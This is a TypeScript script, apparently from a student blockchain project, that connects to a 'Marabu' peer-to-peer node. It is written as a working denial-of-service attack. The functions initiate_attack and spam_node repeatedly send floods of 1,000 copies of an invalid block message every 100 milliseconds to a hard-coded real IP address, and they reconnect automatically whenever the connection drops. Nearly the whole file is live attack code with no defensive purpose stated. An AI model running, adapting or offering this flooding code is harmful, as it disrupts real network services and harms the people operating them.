import * as net from 'net';
import { canonicalize } from 'json-canonicalize';
import { make_coinbase_tx, make_tx, bytesToHex, check_valid_ip, check_valid_dns, _hash_object } from '../utils'
import peers_json from '../peers.json'

function sleep(ms: number) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

export class BasicNode {

    _client: net.Socket;
    _peer: string;

    constructor(peer: string) {

        this._peer = peer
        this._client = new net.Socket();

        // this._client.on('data', (data: string) => {
        //     console.log('Received: ', data.toString());
        // });

        this._client.on('end', () => {
            console.log('Closing connection');
            this._client.destroy();
        });

        this._client.on('error', (err: string) => {
            console.error(`Error: ${err}`);
        });

        this._client.on('close', () => {
            console.log('Connection closed with ', this._peer);
            this._client.destroy();
        })

        this._client.on('drain', () => { })
        this._client.on('lookup', () => { })
        this._client.on('ready', () => { })
        this._client.on('timeout', () => { })

    }

    _write(data: any) {
        if (this._client.destroyed) {
            return;
        }
        try {
            const canonicalized_message: string = canonicalize(data);
            // console.log(`Sent: ${canonicalized_message}\n`)
            this._client.write(canonicalized_message + '\n');
        } catch (err) {
            console.error(`failed to send: ${data}`)
        }

    }
}

function ddos_nodes() {

    const peer_list: string[] = peers_json["peers"];
    for (const peer of peer_list) {
        if (check_valid_ip(peer) || check_valid_dns(peer)) {
            const new_node = new BasicNode(peer);
            const ip_address_components = peer.split(":");
            const host: string = ip_address_components[0];
            const port: number = parseInt(ip_address_components[1]);
            if (host == "135.181.112.99") {
                new_node._client.connect(port, host, () => {
                    console.log("connected to ", peer);
                    spam_node(new_node);
                })
            }
        }
    }
}

function initiate_attack(node: BasicNode) {
    const ip_address_components = node._peer.split(":");
    const host: string = ip_address_components[0];
    const port: number = parseInt(ip_address_components[1]);
    node._client.connect(port, host, () => {
        spam_node(node);
    })
    node._client.on('close', () => {
        const new_node = new BasicNode(node._peer);
        console.log("reopening connection");
        initiate_attack(new_node);

    })
}

async function spam_node(node: BasicNode) {
    const hello_message: any = {
        type: "hello",
        version: "0.9.0",
        agent: "Marabu Test Client",
    };
    node._write(hello_message);

    const canonicalized_json = canonicalize({ "object": { "T": "00000000abc00000000000000000000000000000000000000000000000000000", "created": 1671902581, "miner": "grader", "nonce": "400000000000000000000000000000000000000000000000000000000ffc4942", "note": "This block spends a coinbase transaction not in its prev blocks", "previd": "0000000052a0e645eca917ae1c196e0d0a4fb756747f29ef52594d68484bb5e2", "txids": ["ae75cdf0343674d8368222995ab33e687df8f6a1514fd4060864447de14abb77"], "type": "block" }, "type": "object" });
    let large_message = '';
    for (let i = 0; i < 1000; i++) {
        large_message += (canonicalized_json + '\n')
    }

    while (1) {
        await sleep(100);
        node._client.write(large_message);

    }

}

const new_node = new BasicNode('135.181.112.99:18018');
initiate_attack(new_node);
